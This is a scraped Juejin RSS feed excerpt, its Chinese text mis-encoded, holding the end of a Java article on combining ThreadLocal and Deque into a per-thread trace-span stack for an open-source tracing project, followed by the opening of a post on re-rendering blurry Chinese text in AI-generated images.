<p>åŒä¸€ä¸ªçº¿ç¨‹å†…å¤šæ¬¡è°ƒç”¨ DAO æ–¹æ³•ï¼Œèƒ½å¤ç”¨åŒä¸€ä¸ª Connectionï¼Œä¿è¯äº‹åŠ¡ä¸€è‡´æ€§ã€‚</p>
<h5 data-id="heading-7">3. <strong>æ—¥å¿—è¿½è¸ªï¼ˆMDC - Mapped Diagnostic Contextï¼‰</strong></h5>
<p>SLF4J + Logback ä¸­çš„ <code>MDC</code> å°±æ˜¯åŸºäº <code>ThreadLocal</code> å®ç°çš„ã€‚</p>
<p>ä½ å¯ä»¥åœ¨è¯·æ±‚å…¥å£å¤„è®¾ç½® traceIdï¼š</p>
<pre><code class="hljs language-java" lang="java">MDC.put(<span class="hljs-string">"traceId"</span>, UUID.randomUUID().toString());
logger.info(<span class="hljs-string">"Processing request..."</span>); <span class="hljs-comment">// æ—¥å¿—è‡ªåŠ¨å¸¦ä¸Š traceId</span>
</code></pre>
<p>è¿™æ ·ï¼Œå³ä½¿é«˜å¹¶å‘ä¸‹å¤šä¸ªè¯·æ±‚æ··åœ¨ä¸€èµ·æ‰“æ—¥å¿—ï¼Œä¹Ÿèƒ½é€šè¿‡ traceId è¿½è¸ªå®Œæ•´é“¾è·¯ã€‚</p>
<h5 data-id="heading-8">4. <strong>å¤šç§Ÿæˆ·ï¼ˆTenant IDï¼‰éš”ç¦»</strong></h5>
<p>SaaS ç³»ç»Ÿä¸­ï¼Œå¸¸é€šè¿‡ <code>ThreadLocal</code> åœ¨è¯·æ±‚å¼€å§‹æ—¶è§£æç§Ÿæˆ· IDï¼Œå¹¶åœ¨çº¿ç¨‹å†…å…¨å±€å¯ç”¨ï¼š</p>
<pre><code class="hljs language-java" lang="java">TenantContext.setTenantId(tenantId);
<span class="hljs-comment">// åç»­æ‰€æœ‰ DB æŸ¥è¯¢è‡ªåŠ¨åŠ ä¸Š tenant_id = ? æ¡ä»¶</span>
</code></pre>
<h4 data-id="heading-9">æ³¨æ„äº‹é¡¹</h4>
<ul>
<li><strong>å†…å­˜æ³„æ¼é£é™©</strong>ï¼šçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹é•¿æœŸå­˜æ´»ï¼Œå¦‚æœ <code>ThreadLocal</code> ä¸æ‰‹åŠ¨ <code>remove()</code>ï¼Œå…¶å¼•ç”¨çš„å¯¹è±¡æ— æ³•è¢« GCã€‚</li>
<li><strong>å¼‚æ­¥åœºæ™¯å¤±æ•ˆ</strong>ï¼š<code>CompletableFuture</code>ã€<code>@Async</code> ç­‰ä¼šåˆ‡æ¢çº¿ç¨‹ï¼Œå¯¼è‡´ <code>ThreadLocal</code> ä¸Šä¸‹æ–‡ä¸¢å¤±ï¼ˆéœ€ç”¨ <code>TransmittableThreadLocal</code> è§£å†³ï¼‰ã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfc2b45e1c6a416b9553c493bff884f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5rih6IuH:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769008616&amp;x-signature=wt8vCwcEiK6KSnUyj3grKubgDlE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">ä¸‰ã€Dequeï¼šä¸åªæ˜¯é˜Ÿåˆ—ï¼Œæ›´æ˜¯é«˜æ•ˆçš„â€œæ ˆâ€</h3>
<h4 data-id="heading-11">Deque æ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p><code>Deque</code>ï¼ˆDouble-ended Queueï¼‰æ˜¯ Java é›†åˆæ¡†æ¶ä¸­çš„åŒç«¯é˜Ÿåˆ—æ¥å£ï¼Œæ”¯æŒä»<strong>å¤´éƒ¨å’Œå°¾éƒ¨</strong>é«˜æ•ˆæ’å…¥/åˆ é™¤å…ƒç´ ã€‚</p>
<p>è™½ç„¶åå­—å«â€œé˜Ÿåˆ—â€ï¼Œä½†å®ƒå®Œå…¨å¯ä»¥å½“ä½œ<strong>æ ˆï¼ˆStackï¼‰</strong> æˆ– <strong>æ™®é€šé˜Ÿåˆ—ï¼ˆQueueï¼‰</strong> ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java">Deque&lt;String&gt; deque = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();
deque.push(<span class="hljs-string">"A"</span>); <span class="hljs-comment">// æ ˆæ“ä½œï¼šå‹å…¥</span>
deque.push(<span class="hljs-string">"B"</span>);
System.out.println(deque.pop()); <span class="hljs-comment">// è¾“å‡º "B"ï¼ˆLIFOï¼‰</span>
</code></pre>
<h4 data-id="heading-12">âœ… ä¸ºä»€ä¹ˆç”¨ Deque è€Œä¸æ˜¯ Stackï¼Ÿ</h4>
<p>Java è‡ªå¸¦çš„ <code>Stack</code> ç±»ï¼š</p>
<ul>
<li>ç»§æ‰¿è‡ª <code>Vector</code>ï¼Œæ‰€æœ‰æ–¹æ³•éƒ½æ˜¯ <code>synchronized</code>ï¼Œæ€§èƒ½å·®ï¼›</li>
<li>è®¾è®¡è€æ—§ï¼Œä¸ç¬¦åˆç°ä»£é›†åˆè§„èŒƒã€‚</li>
</ul>
<p>è€Œ <code>ArrayDeque</code>ï¼š</p>
<ul>
<li><strong>éåŒæ­¥</strong>ï¼Œæ€§èƒ½é«˜ï¼›</li>
<li><strong>åº•å±‚æ˜¯å¾ªç¯æ•°ç»„</strong>ï¼Œå†…å­˜è¿ç»­ï¼Œç¼“å­˜å‹å¥½ï¼›</li>
<li>å®˜æ–¹æ–‡æ¡£æ˜ç¡®æ¨èï¼šâ€œ<strong>This class is likely to be faster than Stack when used as a stack</strong>â€ã€‚</li>
</ul>
<h4 data-id="heading-13">å…¸å‹ä½¿ç”¨åœºæ™¯</h4>
<h5 data-id="heading-14">1. <strong>æ–¹æ³•è°ƒç”¨æ ˆæ¨¡æ‹Ÿ</strong></h5>
<p>ç¼–è¯‘å™¨ã€è§£é‡Šå™¨å¸¸ç”¨æ ˆæ¥ç®¡ç†å‡½æ•°è°ƒç”¨ã€‚æ¯è¿›å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå‹å…¥æ ˆå¸§ï¼›è¿”å›æ—¶å¼¹å‡ºã€‚</p>
<h5 data-id="heading-15">2. <strong>æ‹¬å·åŒ¹é…ã€è¡¨è¾¾å¼æ±‚å€¼</strong></h5>
<p>ç®—æ³•é¢˜ç»å…¸åœºæ™¯ï¼šç”¨æ ˆåˆ¤æ–­ <code>({[]})</code> æ˜¯å¦åˆæ³•ï¼Œæˆ–è®¡ç®— <code>3 + (2 * 5)</code>ã€‚</p>
<h5 data-id="heading-16">3. <strong>æ’¤é”€ï¼ˆUndoï¼‰æ“ä½œ</strong></h5>
<p>å›¾å½¢ç¼–è¾‘å™¨ã€æ–‡æœ¬ç¼–è¾‘å™¨çš„â€œæ’¤é”€â€åŠŸèƒ½ï¼Œæœ¬è´¨å°±æ˜¯æŠŠæ“ä½œè®°å½•å‹å…¥æ ˆï¼Œæ’¤é”€æ—¶å¼¹å‡ºå¹¶åå‘æ‰§è¡Œã€‚</p>
<h5 data-id="heading-17">4. <strong>æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</strong></h5>
<p>é€’å½’å®¹æ˜“æ ˆæº¢å‡ºï¼Ÿå¯ä»¥ç”¨æ˜¾å¼æ ˆï¼ˆ<code>Deque</code>ï¼‰å®ç°éé€’å½’ DFSã€‚</p>
<h5 data-id="heading-18">5. <strong>é“¾è·¯è¿½è¸ªä¸­çš„ Span åµŒå¥—</strong></h5>
<p>è¿™æ­£æ˜¯ Spring Insight çš„ç”¨æ³•ï¼æ¯ä¸ªæ–¹æ³•è°ƒç”¨å¯¹åº”ä¸€ä¸ª <code>TraceSpan</code>ï¼Œç”¨æ ˆæ¥ç»´æŠ¤çˆ¶å­å…³ç³»ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">push</span>(rootSpan)
  â†’ <span class="hljs-built_in">push</span>(serviceSpan)
    â†’ <span class="hljs-built_in">push</span>(repoSpan)
    â† <span class="hljs-built_in">pop</span>(repoSpan)
  â† <span class="hljs-built_in">pop</span>(serviceSpan)
â† <span class="hljs-built_in">pop</span>(rootSpan)
</code></pre>
<h3 data-id="heading-19">å››ã€ç»„åˆæŠ€ï¼šThreadLocal + Deque = çº¿ç¨‹ä¸“å±è°ƒç”¨æ ˆ</h3>
<p>ç°åœ¨ï¼ŒæŠŠä¸¤è€…ç»“åˆèµ·æ¥ï¼š</p>
<pre><code class="hljs language-java" lang="java">ThreadLocal&lt;Deque&lt;TraceSpan&gt;&gt; SPAN_STACK
</code></pre>
<p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š</p>
<blockquote>
<p><strong>æ¯ä¸ªçº¿ç¨‹éƒ½æ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ Span æ ˆï¼Œç”¨æ¥è®°å½•å½“å‰è¯·æ±‚çš„è°ƒç”¨é“¾è·¯ã€‚</strong></p>
</blockquote>
<h4 data-id="heading-20">è¿™è§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h4>
<p>å‡è®¾ä¸€ä¸ª HTTP è¯·æ±‚è¿›æ¥ï¼Œæ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs">Controller â†’ Service â†’ Repository â†’ DB
</code></pre>
<p>æˆ‘ä»¬å¸Œæœ›ä¸ºæ¯ä¸€æ­¥ç”Ÿæˆä¸€ä¸ª <code>TraceSpan</code>ï¼Œå¹¶å½¢æˆçˆ¶å­å…³ç³»ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2202897a1145443283c25817f830068e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5rih6IuH:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769008616&amp;x-signature=mrH7Anxqb2zmCZ13MmtUaY%2FNs5k%3D" alt="" loading="lazy"/></p>
<p>è€Œ <code>SPAN_STACK</code> æ­£æ˜¯å®ç°è¿™ç§åµŒå¥—ç»“æ„çš„å…³é”®ï¼š</p>
<ol>
<li><strong>è¿›å…¥ Controller</strong>ï¼šåˆ›å»ºæ ¹ Spanï¼Œ<code>push</code> åˆ°æ ˆï¼›</li>
<li><strong>è¿›å…¥ Service</strong>ï¼šä»¥æ ˆé¡¶ Span ä¸ºçˆ¶ï¼Œåˆ›å»ºå­ Spanï¼Œå† <code>push</code>ï¼›</li>
<li><strong>é€€å‡º Repository</strong>ï¼š<code>pop()</code> å‡ºå½“å‰ Spanï¼Œç»“æŸè®¡æ—¶ï¼Œä¸ŠæŠ¥ï¼›</li>
<li><strong>æœ€ç»ˆå›åˆ° Controller</strong>ï¼š<code>pop()</code> æ ¹ Spanï¼Œå®Œæˆæ•´æ¡é“¾è·¯ã€‚</li>
</ol>
<blockquote>
<p>ğŸ’¡ <strong>å…³é”®ç‚¹</strong>ï¼šå› ä¸ºæ ˆæ˜¯ <code>ThreadLocal</code> çš„ï¼Œæ‰€ä»¥å³ä½¿æœ‰ 1000 ä¸ªå¹¶å‘è¯·æ±‚ï¼Œæ¯ä¸ªçº¿ç¨‹çš„è°ƒç”¨æ ˆä¹Ÿå®Œå…¨ç‹¬ç«‹ï¼Œä¸ä¼šä¸²é”™ï¼</p>
</blockquote>
<h4 data-id="heading-21">ç¤ºæ„å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4624903a5adc4f5cb9e508224fab6949~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5rih6IuH:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769008616&amp;x-signature=7KHRP%2BR%2Fov4Ih%2FJdHJ%2BqvDEgxYE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-22">äº”ã€åœ¨ Spring Insight ä¸­çš„å®é™…åº”ç”¨ï¼ˆæ€è·¯é¢„è§ˆï¼‰</h3>
<p>è™½ç„¶ Spring Insight é¡¹ç›®è¿˜åœ¨å¼€å‘ä¸­ï¼Œä½†è¿™æ®µä»£ç å·²ç»å¥ å®šäº†<strong>ä¸Šä¸‹æ–‡ç®¡ç†çš„æ ¸å¿ƒéª¨æ¶</strong>ï¼š</p>
<ul>
<li><code>TraceContext.startSpan("operation")</code>ï¼šå†…éƒ¨è°ƒç”¨ <code>SPAN_STACK.get().push(newSpan)</code></li>
<li><code>TraceContext.endSpan()</code>ï¼š<code>pop()</code> å¹¶ç»“æŸè®¡æ—¶</li>
<li><code>TraceContext.currentSpan()</code>ï¼š<code>peek()</code> è·å–å½“å‰ Spanï¼Œç”¨äºä¼ é€’ traceId/spanId</li>
<li>è¯·æ±‚ç»“æŸæ—¶è°ƒç”¨ <code>TraceContext.clear()</code>ï¼šé˜²æ­¢çº¿ç¨‹æ± å¤ç”¨å¯¼è‡´ä¸Šä¸‹æ–‡æ±¡æŸ“</li>
</ul>
<blockquote>
<p>âœ… <strong>è¿™ç§è®¾è®¡å¤©ç„¶æ”¯æŒå¼‚æ­¥å—ï¼Ÿ</strong><br/>
æš‚æ—¶ä¸æ”¯æŒï¼ä½†æœªæ¥å¯é€šè¿‡ <code>TransmittableThreadLocal</code>ï¼ˆé˜¿é‡Œå¼€æºï¼‰æ‰©å±•ï¼Œå®ç°è·¨çº¿ç¨‹ä¸Šä¸‹æ–‡ä¼ é€’ã€‚</p>
</blockquote>
<h3 data-id="heading-23">å…­ã€æ€»ç»“ï¼šå°ç»“æ„ï¼Œå¤§ä½œç”¨</h3>

























<table><thead><tr><th>ç»„ä»¶</th><th>ä½œç”¨</th><th>çœŸå®ä¸–ç•Œç±»æ¯”</th></tr></thead><tbody><tr><td><code>ThreadLocal</code></td><td>çº¿ç¨‹éš”ç¦»çš„ä¸Šä¸‹æ–‡å­˜å‚¨</td><td>æ¯ä¸ªæœåŠ¡å‘˜æœ‰è‡ªå·±çš„ç‚¹èœå•</td></tr><tr><td><code>Deque</code>ï¼ˆä½œæ ˆç”¨ï¼‰</td><td>ç®¡ç†åµŒå¥—è°ƒç”¨çš„ç”Ÿå‘½å‘¨æœŸ</td><td>å‡½æ•°è°ƒç”¨çš„â€œå›æº¯è·¯å¾„â€</td></tr><tr><td><code>SPAN_STACK</code></td><td>äºŒè€…ç»“åˆï¼Œæ„å»ºçº¿ç¨‹å®‰å…¨çš„è¿½è¸ªæ ˆ</td><td>æ¯ä¸ªè¯·æ±‚çš„â€œè¡Œè½¦è®°å½•ä»ªâ€</td></tr></tbody></table>
<p>è¿™å°±åƒç»™æ¯ä¸ªçº¿ç¨‹é…äº†ä¸€ä¸ªâ€œè¡Œè½¦è®°å½•ä»ªâ€ï¼Œå…¨ç¨‹è®°å½•å®ƒå¹²äº†å•¥ã€èŠ±äº†å¤šä¹…ã€æœ‰æ²¡æœ‰å‡ºé”™ã€‚</p>
<p>è€Œè¿™ä¸€åˆ‡ï¼Œéƒ½å§‹äºé‚£å‡ è¡Œçœ‹ä¼¼å¹³æ·¡çš„åˆå§‹åŒ–ä»£ç ã€‚</p>
<h3 data-id="heading-24">ğŸŒŸ æœ€åï¼šæ¬¢è¿å…³æ³¨ Spring Insightï¼</h3>
<p>å¦‚æœä½ å¯¹é“¾è·¯è¿½è¸ªã€APMã€Java Agent æ„Ÿå…´è¶£ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„å¼€æºé¡¹ç›®ï¼š</p>
<blockquote>
<p>ğŸ”— <strong>GitHub åœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fiweidujiang%2Fspring-insight" target="_blank" title="https://github.com/iweidujiang/spring-insight" ref="nofollow noopener noreferrer">github.com/iweidujiangâ€¦</a></p>
</blockquote>
<p>ç›®å‰é¡¹ç›®åŒ…å«ï¼š</p>
<ul>
<li>Agent æ¨¡å—ï¼šè‡ªåŠ¨åŸ‹ç‚¹ã€Span é‡‡é›†</li>
<li>Collector æ¨¡å—ï¼šæ¥æ”¶å¹¶å­˜å‚¨é“¾è·¯æ•°æ®</li>
<li>Storage æ¨¡å—ï¼šåŸºäº MyBatis-Plus çš„æŒä¹…åŒ–</li>
<li>åç»­å°†åŠ å…¥ Web UIã€æ‹“æ‰‘å›¾ã€å‘Šè­¦ç­‰èƒ½åŠ›ï¼</li>
</ul>
<p><strong>ä½ çš„ Star æ˜¯å¯¹æˆ‘æœ€å¤§çš„é¼“åŠ±ï¼</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5b8abe2c420a4bc1b7d73cfa5f0de8bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5rih6IuH:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769008616&amp;x-signature=%2BbzergimyariRdR5h5w5v582FZ4%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nano Bananaè¿›è¡ŒAIç»˜ç”»ä¸­æ–‡æ€»æ˜¯ç³Šï¼Ÿä¸€æ‹›å¯é‡æ–°æ¸²æŸ“ï¼Œæ¸…æ™°åˆ°å¯ç›´æ¥æ±‡æŠ¥]]></title>    <link>https://juejin.cn/post/7595088396440256562</link>    <guid>https://juejin.cn/post/7595088396440256562</guid>    <pubDate>2026-01-14T14:09:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595088396440256562" data-draft-id="7595088396440240178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nano Bananaè¿›è¡ŒAIç»˜ç”»ä¸­æ–‡æ€»æ˜¯ç³Šï¼Ÿä¸€æ‹›å¯é‡æ–°æ¸²æŸ“ï¼Œæ¸…æ™°åˆ°å¯ç›´æ¥æ±‡æŠ¥"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-14T14:09:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mantch"/> <meta itemprop="url" content="https://juejin.cn/user/2788017218532232"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nano Bananaè¿›è¡ŒAIç»˜ç”»ä¸­æ–‡æ€»æ˜¯ç³Šï¼Ÿä¸€æ‹›å¯é‡æ–°æ¸²æŸ“ï¼Œæ¸…æ™°åˆ°å¯ç›´æ¥æ±‡æŠ¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2788017218532232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mantch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:09:16.000Z" title="Wed Jan 14 2026 14:09:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¹³æ—¶ç”¨ <code>Nano Banana</code> ç”Ÿæˆæ¶æ„å›¾ã€æµ·æŠ¥ã€æµç¨‹å›¾æ—¶ï¼Œä½ å¯èƒ½ä¹Ÿé‡åˆ°è¿‡è¿™ç§â€œåˆçˆ±åˆæ¨â€çš„æƒ…å†µï¼š
å›¾ç‰‡æ•´ä½“æ•ˆæœå¾ˆå¥½ã€æ„å›¾å¾ˆå¼ºã€ç†è§£ä¹Ÿåˆ°ä½ï¼Œä½†<strong>ä¸€åˆ°ä¸­æ–‡å°±ç¿»è½¦</strong>â€”â€”è¦ä¹ˆå­—ç³Šæˆä¸€å›¢ï¼Œè¦ä¹ˆç¬”ç”»ç¼ºå¤±ã€é”™ä½ï¼Œç”šè‡³å‡ºç°â€œåƒä¸­æ–‡ä½†ä¸æ˜¯ä¸­æ–‡â€çš„è¯¡å¼‚å­—ç¬¦ã€‚ç”¨æ¥å†…éƒ¨è®¨è®ºè¿˜è¡Œï¼Œä¸€æ—¦è¦å‘ç¾¤ã€åšæ±‡æŠ¥ã€å†™æ–¹æ¡ˆï¼Œå°±å¾ˆéš¾ç›´æ¥ç”¨ã€‚</p>
<p>å°±åƒè¿™æ ·ğŸ™ƒğŸ™ƒï¼š</p>
<div>
<div>
<div class="cxd-Flex" data-role="container">
  <span class="cxd-TplField fr-view">
    <span>
        <img class="image-container" src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f11571c01720443aa58d12d49cd73996~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWFudGNo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769004555&amp;x-signature=FHfOgIUuAaLnNi7a5OoeVOAnnWY%3D" alt="" loading="lazy"/>
    </span>
  </span>
</div>
</div>
<br/><br/>
</div>
<p>äºæ˜¯å‘¢å°±æƒ³ç€å›½å†…çš„è§†è§‰æ¨¡å‹ä¹Ÿå¾ˆå¼ºï¼Œå¹¶ä¸”å¯¹ä¸­æ–‡éå¸¸å‹å¥½ï¼Œä½•ä¸ç»“åˆèµ·æ¥è¯•è¯•ï¼Ÿæœç„¶æˆåŠŸäº†ï¼ğŸ˜</p>
<p>è¿™ç¯‡æ–‡ç« åˆ†äº«ä¸€ä¸ªéå¸¸å®ç”¨ã€æˆåŠŸç‡å¾ˆé«˜çš„å·¥ä½œæµï¼š
ç”¨ <strong>Nano Banana è´Ÿè´£ç”Ÿæˆå›¾ï¼ˆæ„å›¾/å¸ƒå±€/ç†è§£ï¼‰</strong> ï¼Œå†ç”¨ <strong>å­—èŠ‚è·³åŠ¨ Seedream 4.5 è´Ÿè´£æŠŠä¸­æ–‡æ–‡å­—é‡æ–°æ¸²æŸ“æ¸…æ™°</strong>ã€‚ä¸¤è€…é…åˆï¼Œå°±æ˜¯å…¸å‹çš„â€œä¸­è¥¿åˆç’§â€ã€‚</p>
<hr/>
<h2 data-id="heading-0">1. ä¸ºä»€ä¹ˆ Nano Banana ç”Ÿæˆçš„ä¸­æ–‡ç»å¸¸ä¸æ¸…æ™°ï¼Ÿ</h2>
<p>æ ¸å¿ƒåŸå› é€šå¸¸ä¸æ˜¯ä½ æç¤ºè¯å†™å¾—ä¸å¤Ÿç»†ï¼Œè€Œæ˜¯æ¨¡å‹è®­ç»ƒå¯¼è‡´çš„èƒ½åŠ›åå·®ï¼š</p>
<ul>
<li>
<p>Nano Banana çš„è®­ç»ƒæ•°æ®ä¸­ <strong>è‹±æ–‡/æ‹‰ä¸å­—ç¬¦å æ¯”æ›´å¤§</strong></p>
</li>
<li>
<p>ä¸­æ–‡å­—ä½“çš„<strong>ç¬”ç”»å¯†åº¦é«˜ã€ç»“æ„å¤æ‚</strong>ï¼Œå°¤å…¶åœ¨å°å­—å·ã€ç»†çº¿æ¡ã€å›¾å½¢å åŠ èƒŒæ™¯çš„æƒ…å†µä¸‹ï¼Œå¯¹æ¨¡å‹çš„åƒç´ çº§æ¸²æŸ“è¦æ±‚æ›´é«˜</p>
</li>
<li>
<p>ç»“æœå°±æ˜¯ï¼šå¸ƒå±€å¾ˆå¯¹ï¼Œä¸­æ–‡å´å®¹æ˜“å‡ºç°</p>
<ul>
<li>ç¬”ç”»ç²˜è¿ã€æ–­è£‚</li>
<li>åæ—éƒ¨é¦–é”™ä½</li>
<li>å­—ä½“â€œåƒæ‰‹å†™ä½†ä¸æ¸…æ™°â€</li>
<li>ç”šè‡³ç”Ÿæˆâ€œä¼ªä¸­æ–‡â€</li>
</ul>
